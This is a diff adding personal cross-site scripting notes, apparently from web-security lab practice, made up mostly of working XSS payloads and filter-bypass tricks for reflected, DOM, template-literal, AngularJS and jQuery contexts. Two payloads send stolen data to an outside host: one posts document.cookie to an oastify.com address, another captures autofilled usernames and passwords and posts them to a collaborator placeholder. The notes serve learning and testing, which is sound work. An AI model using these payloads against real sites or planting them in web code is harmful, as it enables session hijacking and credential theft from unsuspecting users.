@@ -1,0 +1,62 @@
+ alert(document.domain)
+Stealing cookies is a traditional way to exploit XSS
+problem for stealing cookie:
+-Many applications hide their cookies from JavaScript using the HttpOnly flag. 
+-Sessions might be locked to additional factors like the user's IP address.
+-The session might time out before you're able to hijack it. 
+-The victim might not be logged in.
+The Fetch API interface allows web browser to make HTTP requests to web servers. like XMLHttpRequest
+payload to hijack cookie:
+<script>
+fetch('https://6hofmn6anurmuai43v11guykvb1apz.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+payload to hijack auto-fill password:
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+some times you have to create custom tags like bellow:
+<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
+and inject it in html file that execute with specific url:
+body of html:
+<script>
+location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+<svg><animatetransform onbegin=alert(1)>
+some times you have to close cot and inject (always check view source)
+"+onmouseover="alert(1)"
+';alert(1);//
+';alert(1)
+";alert(1);//
+\\';alert(document.domain)//
+&apos;-alert(document.domain)-&apos;
+"><script>alert(document.domain)</script>
+html injection payload:
+">input type=text onwheel=al\u0065rt(`xss`)>
+alert ---> prompt(1)
+      ---> confirm(1)
+if your input make link like <a href="input"> inject javascript:alert(document.domain)
+when js is using directly for input (after visiting source code) use:
+'</script><script>alert("hacked")</script>//'
+ Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax. 
+you can use the following payload to execute JavaScript without terminating the template literal:
+${alert(document.domain)}
+when the request just send in network of browser not in url you have to make requset in url
+The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements
+when there is jquery: 
+	$(window).on('hashchange', function() {
+	var element = $(location.hash);}
+it means with changes of location.hash the function will run so you can inject iframe code to $().
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+when there is angular js and there is ng-app you can use bellow payload for xss
+{{$on.constructor('alert(1)')()}}
+ Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response
+so you have to inject into json whenever there is eval function 
+if there is replace function in js forexample for < or > it means replace just one < and one >. so you can add extra < or > to bypass.
+<><img src=1 onerror=alert(1)>
